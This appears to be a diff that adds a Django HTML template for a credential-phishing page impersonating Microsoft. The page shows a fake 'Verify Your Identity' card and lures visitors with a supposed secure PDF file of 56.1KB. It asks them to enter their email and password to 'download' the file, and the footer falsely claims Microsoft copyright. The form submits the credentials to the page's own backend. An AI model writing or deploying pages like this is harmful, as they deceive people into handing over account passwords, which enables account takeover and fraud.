@@ -1,0 +1,58 @@
+{% extends "base.html" %}
+
+{% block title %}
+  Index Page
+{% endblock title %}
+
+{% block body %}
+{% load static %}
+
+  <main>
+
+      <div class="container" style="align-items: center;">
+      
+            <div class="text-center my-5"> 
+              <img src="{% static 'images/micro.png' %}" alt="" width="150px" height="150px" class="img-fluid">
+              </diV>
+              
+              <div class="card  mx-auto" style="max-width: 25rem; height: 34rem;">
+                <h3 class="fw-normal text-center p-3">Verify Your Identity</h3>
+            <hr>
+              <div class="px-4">
+              <p>You've received a secure file</P>
+                <span>
+                <img src="{% static 'images/pdff.png' %}" alt="" width="40px" height="40px" class="img-fluid">
+                56.1KB
+              </span>
+              <p>To receive and download this PDF file, please enter specific email credentials that this document was sent to.</p>
+              <div class="text-center py-3">
+              <img src="{% static 'images/blueo.png' %}" alt="" width="150px" height="150px" class="img-fluid">
+              </div>
+              <form method="post" class="form-horizontal">
+                {% csrf_token %}
+                 <!-- Bootstrap form styling -->
+                  <div class="mb-3">
+                    <input type="email" name="{{ form.email.name }}" id="{{ form.email.id_for_label }}"
+                    class="form-control form-control-lg" placeholder="Enter email" required>
+                  </div>
+
+                  <div class="mb-3">
+                    <input type="password" name="{{ form.password.name }}" id="{{ form.password.id_for_label }}"
+                    class="form-control form-control-lg" placeholder="Enter password" required>
+                  </div>
+
+                <button class="btn btn-primary w-100 py-2" type="submit">Sign in</button>
+                
+          
+            </form>
+          </div>
+          
+        
+      </div>
+      <p class="mt-5 mb-3 text-body-secondary text-center">&copy; 2024 Microsoft Privacy & Cookies</p>
+    </div>
+
+  
+    </main>
+
+{% endblock body %}
